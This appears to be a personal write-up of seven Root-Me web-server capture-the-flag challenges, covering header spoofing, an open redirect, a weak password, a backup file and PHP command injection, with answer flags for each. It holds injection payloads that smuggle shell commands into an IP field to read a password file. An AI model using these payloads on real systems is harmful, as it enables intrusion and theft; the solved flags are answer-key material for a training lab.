# [Root-Me](./rootme.md) Root-Me Web Server [7/74]

Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!

These challenges are designed to train users on HTML, HTTP and other server side mechanisms. The following series of challenges will cultivate a better understanding of techniques such as : Basic workings of multiple authentication mechanisms, handling form data, inner workings of web applications, etc. ...

## Contents

1. [HTML - Source code](#html-source-code) 🗸
2. [HTTP - IP restriction bypass](#http-ip-restriction-bypass) 🗸
3. [HTTP - Open redirect](#http-open-redirect) 🗸
4. [HTTP - User-agent](#http-user-agent) 🗸
5. [Weak password](#weak-password) 🗸
6. [PHP - Command injection](#php-command-injection) 🗸
7. [Backup file](#backup-file) 🗸
8. [HTTP - Directory indexing](#http-directory-indexing)
9. [HTTP - Headers](#http-headers)
10. [HTTP - POST](#http-post)
11. [HTTP - Improper redirect](#http-improper-redirect)
12. [HTTP - Verb tampering](#http-verb-tampering)
13. [Install files](#install-files)
14. [CRLF](#crlf)
15. [File upload - Double extensions](#file-upload-double-extensions)
16. [File upload - MIME type](#file-upload-mime-type)
17. [HTTP - Cookies](#http-cookies)
18. [Insecure Code Management](#insecure-code-management)
19. [JSON Web Token (JWT) - Introduction](#json-web-token-jwt-introduction)
20. [Directory traversal](#directory-traversal)
21. [File upload - Null byte](#file-upload-null-byte)
22. [JSON Web Token (JWT) - Weak secret](#json-web-token-jwt-weak-secret)
23. [JWT - Revoked token](#jwt-revoked-token)
24. [PHP - assert()](#php-assert)
25. [PHP - Filters](#php-filters)
26. [PHP - register globals](#php-register-globals)
27. [PHP - Remote Xdebug](#php-remote-xdebug)
28. [Python - Server-side Template Injection Introduction](#python-server-side-template-injection-introduction)
29. [File upload - ZIP](#file-upload-zip)
30. [Command injection - Filter bypass](#command-injection-filter-bypass)
31. [Java - Server-side Template Injection](#java-server-side-template-injection)
32. [JSON Web Token (JWT) - Public key](#json-web-token-jwt-public-key)
33. [Local File Inclusion](#local-file-inclusion)
34. [Local File Inclusion - Double encoding](#local-file-inclusion-double-encoding)
35. [Node - Eval](#node-eval)
36. [PHP - Loose Comparison](#php-loose-comparison)
37. [PHP - preg_replace()](#php-preg-replace)
38. [PHP - type juggling](#php-type-juggling)
39. [Remote File Inclusion](#remote-file-inclusion)
40. [SQL injection - Authentication](#sql-injection-authentication)
41. [SQL injection - Authentication - GBK](#sql-injection-authentication-gbk)
42. [SQL injection - String](#sql-injection-string)
43. [XSLT - Code execution](#xslt-code-execution)
44. [LDAP injection - Authentication](#ldap-injection-authentication)
45. [Node - Serialize](#node-serialize)
46. [NodeJS - Prototype Pollution Bypass](#nodejs-prototype-pollution-bypass)
47. [NoSQL injection - Authentication](#nosql-injection-authentication)
48. [PHP - Path Truncation](#php-path-truncation)
49. [PHP - Serialization](#php-serialization)
50. [SQL injection - Numeric](#sql-injection-numeric)
51. [SQL Injection - Routed](#sql-injection-routed)
52. [SQL Truncation](#sql-truncation)
53. [XML External Entity](#xml-external-entity)
54. [XPath injection - Authentication](#xpath-injection-authentication)
55. [Yaml - Deserialization](#yaml-deserialization)
56. [GraphQL](#graphql)
57. [Java - Spring Boot](#java-spring-boot)
58. [Local File Inclusion - Wrappers](#local-file-inclusion-wrappers)
59. [PHP - Eval](#php-eval)
60. [PHP - Unserialize overflow](#php-unserialize-overflow)
61. [SQL injection - Error](#sql-injection-error)
62. [SQL injection - Insert](#sql-injection-insert)
63. [SQL injection - File reading](#sql-injection-file-reading)
64. [XPath injection - String](#xpath-injection-string)
65. [NoSQL injection - Blind](#nosql-injection-blind)
66. [SQL injection - Time based](#sql-injection-time-based)
67. [NodeJS - vm escape](#nodejs-vm-escape)
68. [Server Side Request Forgery](#server-side-request-forgery)
69. [SQL injection - Blind](#sql-injection-blind)
70. [LDAP injection - Blind](#ldap-injection-blind)
71. [PHP - Unserialize Pop Chain](#php-unserialize-pop-chain)
72. [Python - Blind SSTI Filters Bypass](#python-blind-ssti-filters-bypass)
73. [XPath injection - Blind](#xpath-injection-blind)
74. [SQL injection - Filter bypass](#sql-injection-filter-bypass)


---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTML Source Code

- Author: g0uZ
- Date: 3 October 2006
- Points: 5
- Level: 1

### Statement

None.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch1/).

### Resources

1. [RFC 1945](https://repository.root-me.org/RFC/EN%20-%20rfc1945.txt).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <!--
Bienvenue sur ce portail,
Welcome on this portal,
J'espère que vous passerez un agréable moment parmi nous, mais surtout que vous repartirez plein de choses dans la tête...
I hope that you will enjoy your time among us, and above that all you will leave with lots of things in the head ...
@ très bientôt
See ya
-->
    <h1>Login v0.00001
    </h1>
    <form>
      Password&nbsp;
      <input type="password" value="" name="password"/>
      <br/>
      <input type="submit" value="login" />
    </form>
    <!--
Je crois que c'est vraiment trop simple là !
It's really too easy !
password : nZ^&@q5&sjJHev0
-->
  </body>
</html>
~~~

We can see the password is included in the html.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
nZ^&@q5&sjJHev0
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP IP restriction bypass

- Author: Cyrhades
- Date: 23 March 2021
- Points: 10
- Level: 1

### Statement

Dear colleagues,

We’re now managing connections to the intranet using private IP addresses, so it’s no longer necessary to login with a username / password when you are already connected to the internal company network.

Regards,

The network admin

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch68/).

### Resources

1. [RFC 1918](https://repository.root-me.org/RFC/EN%20-%20rfc1918.txt).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):

~~~html
<!DOCTYPE html>
<html>
  <head>
    <title>Secured Intranet
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <span>Your IP 
      <strong>::ffff:86.13.104.48
      </strong> do not belong to the LAN.
    </span>
    <h1>Intranet
    </h1>
    <form method="post">
      <p>
        <label for="login">Login:
        </label>
        <input type="text" name="login">
      </p>
      <p>
        <label for="pass">Password:
        </label>
        <input type="text" name="mdp">
      </p>
      <p>
        <input type="submit" value="login">
      </p>
      <p>
        <small>You should authenticate because you're not on the LAN.
        </small>
      </p>
    </form>
  </body>
</html>
~~~

Assuming the LAN is a private IP address, we can send a curl request with a cutom IP 192.168.0.2:

~~~shell
$ curl --header "X-Forwarded-For: 192.168.0.1" http://challenge01.root-me.org/web-serveur/ch68/
~~~

We get a html response with the solution:

~~~html
<!DOCTYPE html>
<html>
  <head>
    <title>Secured Intranet
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h1>Intranet
    </h1>
    <div>
      Well done, the validation password is: 
      <strong>Ip_$po0Fing
      </strong>
    </div>
  </body>
</html>
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
Ip_$po0Fing
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP Open redirect

- Author: Swissky
- Date: 2 August 2017
- Points: 10
- Level: 1

### Statement

Find a way to make a redirection to a domain other than those showed on the web page.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch52/).

### Resources

1. [Understanding and Discovering Open Redirect Vulnerabilities](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Understanding%20and%20Discovering%20Open%20Redirect%20Vulnerabilities%20-%20Trustwave.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):

~~~html
<!DOCTYPE html>
<html>
  <head>
    <title>HTTP - Open redirect
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h1>Social Networks
    </h1>
    <a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook
    </a>
    <a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter
    </a>
    <a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack
    </a>
    <style type="text/css">
      body{
        text-align: center;
        font-family: arial;
      }
      a{
        color: #FFFFFF;
        text-decoration: none;
        text-transform: capitalize;
        padding: 8px;
        background-color: #1CB2D2;
        border-radius: 5px;
        width: 100px;
        display: inline-block;
      }
      a:hover{
        background-color: #3968A9;
      }
      #error{
        color: red;
        font-weight: bold;
      }
    </style>
  </body>
</html>
~~~

We can see 3 links to facebook, twitter and slack.  These links are redirects that include the string md5 hash.  We can test it with a new redirect:

~~~
?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f
~~~

When navigating, we can see the site briefly redirects to the flag before redirecting to the directed website.  We can write a short Python script to capture the flag:

~~~py
import hashlib
import requests

URL = "http://challenge01.root-me.org/web-serveur/ch52/"
a = "https://google.com"
b = hashlib.md5(a.encode())

redirect = "?url="+a+"&h="+b.hexdigest()
print(redirect)

r = requests.Session()
website = r.get(URL+redirect)
print(website.text)
~~~

We get the intermediary redirect as the response:

~~~html
<!DOCTYPE html>
<html>
<head>
        <title>HTTP - Open redirect</title>
</head>


<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5
</p><script>document.location = 'https://google.com';</script>
<style type="text/css">
        body{
                text-align: center;
                font-family: arial;
        }

        a{
                color: #FFFFFF;
                text-decoration: none;
                text-transform: capitalize;
                padding: 8px;
                background-color: #1CB2D2;
                border-radius: 5px;
                width: 100px;
                display: inline-block;
        }
        a:hover{
                background-color: #3968A9;
        }

        #error{
                color: red;
                font-weight: bold;
        }

</style>
</body>
</html>
~~~

This gives us the challenge solution

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
e6f8a530811d5a479812d7b82fc1a5c5
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP User agent

- Author: g0uZ
- Date: 3 October 2006
- Points: 10
- Level: 1

### Statement

None.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch2/).

### Resources

1. [RFC 2616](https://repository.root-me.org/RFC/EN%20-%20rfc2616.txt).
2. [RFC 1945](https://repository.root-me.org/RFC/EN%20-%20rfc1945.txt).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h3>Wrong user-agent: you are not the "admin" browser!
    </h3>
  </body>
</html>
~~~

We have the wrong user agent.  We can use curl to visit the site with a custom user agent:

~~~shell
$ curl -A "admin" http://challenge01.root-me.org/web-serveur/ch2/
~~~

We get the html response:

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h3>Welcome master!
      <br/>Password: rr$Li9%L34qd1AAe27
    </h3>
  </body>
</html>
~~~

This gives us the challenge solution

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
rr$Li9%L34qd1AAe27
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Weak password

- Author: g0uZ
- Date: 3 October 2006
- Points: 10
- Level: 1

### Statement

None.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch3/).

### Resources

1. [OWASP testing guide v2](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v2.pdf).
2. [OWASP testing guide v3](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v3.pdf).
3. [OWASP testing guide v4](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Navigating to the challenge site, we try "admin/admin" and are logged in!

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
admin
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## PHP Command Injection

- Author: sambecks
- Date: 20 September 2017
- Points: 10
- Level: 1

### Statement

Find a vulnerabilty in this service and exploit it.

The flag is on the index.php file.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch54/).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Navigating to the challenge site, we find the html site:

~~~html
<html>
  <head>
    <title>Ping Service
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <form method="POST" action="index.php">
      <input type="text" name="ip" placeholder="127.0.0.1">
      <input type="submit">
    </form>
    <pre>
</pre>
  </body>
</html>
~~~

We can see the ip address is passed to a "ping" command, and the website prints the shell output.  We can inject shell commands into the form:

~~~
8.8.8.8; ls -l
~~~

The webpage returns:

~~~
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=1.99 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=1.95 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=118 time=1.85 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 1.851/1.931/1.992/0.059 ms
total 4
-rw-r----- 1 web-serveur-ch54 www-data 438 Dec 10 21:20 index.php
~~~

We can see the index.php file there. trying cat returns a second form.  We can now view the php code:

~~~php
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
~~~

We can see the flag is stored in a hidden file .passwd.  We can view this with inject:

~~~
8.8.8.8; cat .passwd
~~~

This gives us the solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
S3rv1ceP1n9Sup3rS3cure
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Backup File

- Author: g0uZ
- Date: 27 Feruary 2011
- Points: 15
- Level: 2

### Statement

No clue.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch11/).

### Resources

1. [OWASP testing guide v2](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v2.pdf).
2. [OWASP testing guide v3](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v3.pdf).
3. [OWASP testing guide v4](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page with a form:

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h1>Authentication v 0.00
    </h1>
    <h3>Error : no such user/password
      </h2>
    <br />
    <form action="" method="post">
      Login&nbsp;
      <br/>
      <input type="text" name="username" />
      <br/>
      <br/>
      Password&nbsp;
      <br/>
      <input type="password" name="password" />
      <br/>
      <br/>
      <br/>
      <br/>
      <input type="submit" value="connect" />
      <br/>
      <br/>
    </form>
  </body>
</html>

~~~

Inspecting the sources, we see a file (index).  This is likely a php file so we can navigate to /index.php.  We get the website, so we now know the site uses PHP. Assuming the file has been mistakenly left on the server, we can look for index.php~ which will be a remnant from a make command when not run with the clean flag.  We try index.php and find:

~~~html
<?php

$username="ch11";
$password="OCCY9AcNm1tj";


echo '
      <html>
      <body>
	<h1>Authentication v 0.00</h1>
';

if ($_POST["username"]!="" && $_POST["password"]!=""){
    if ($_POST["username"]==$user && $_POST["password"]==$password)
    {
      print("<h2>Welcome back {$row['username']} !</h2>");
      print("<h3>Your informations :</h3><p>- username : $row[username]</p><br />");
      print("To validate the challenge use this password</b>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");

    }
}

echo '
	<form action="" method="post">
	  Login&nbsp;<br/>
	  <input type="text" name="username" /><br/><br/>
	  Password&nbsp;<br/>
	  <input type="password" name="password" /><br/><br/>
	  <br/><br/>
	  <input type="submit" value="connect" /><br/><br/>
	</form>
      </body>
      </html>
';

?> 
~~~

We can now login to the website with the username and password specified and get a message telling us the password is the challenge solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
OCCY9AcNm1tj
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

Last updated Jan 2022.

## [djm89uk.github.io](https://djm89uk.github.io)
